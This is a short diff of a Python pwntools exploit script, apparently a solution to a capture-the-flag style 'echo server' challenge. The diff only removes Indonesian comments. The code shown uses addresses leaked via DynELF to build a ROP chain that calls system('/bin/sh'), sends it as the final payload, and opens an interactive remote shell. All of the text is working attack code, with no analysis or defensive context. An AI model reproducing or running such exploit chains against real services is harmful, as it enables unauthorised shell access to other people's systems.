@@ -195,17 +195,14 @@ def dynelf_exploit():
 
 def exploit():
    
-    # Mulai eksploitasi dengan DynELF
     system_addr, bin_sh_addr = dynelf_exploit()
 
-    # Payload akhir untuk memanggil system("/bin/sh")
     log.info("Sending final payload to spawn shell...")
     rop = ROP(elf)
     rop.call(system_addr, [bin_sh_addr])  # Memanggil system("/bin/sh")
     final_payload = flat({offset: rop.chain()})
     p.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", final_payload)
 
-    # Berikan shell interaktif
     p.interactive()
 
 if __name__ == "__main__":
